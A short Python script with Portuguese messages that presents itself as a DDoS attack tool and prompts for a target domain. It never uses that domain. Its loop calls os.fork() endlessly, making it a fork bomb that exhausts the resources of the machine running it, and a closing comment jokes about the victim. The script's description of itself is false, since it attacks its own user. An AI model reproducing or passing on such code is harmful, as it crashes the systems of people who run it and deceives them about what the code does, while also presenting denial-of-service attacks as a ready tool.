import time
from os import fork

print('\033[36m-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-')
print('Script de DDoS feito por Chat-D3V(VRC)')
print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-')

ddos = input('\n\033[31mDigite o domínio para iniciar ataque: ')
x = 0
count = 0
while x == 0:
    count += 1
    time.sleep(.01)
    print('{} DDoS'.format(count))
    fork()

# Ta me devendo um glub glub hein :D
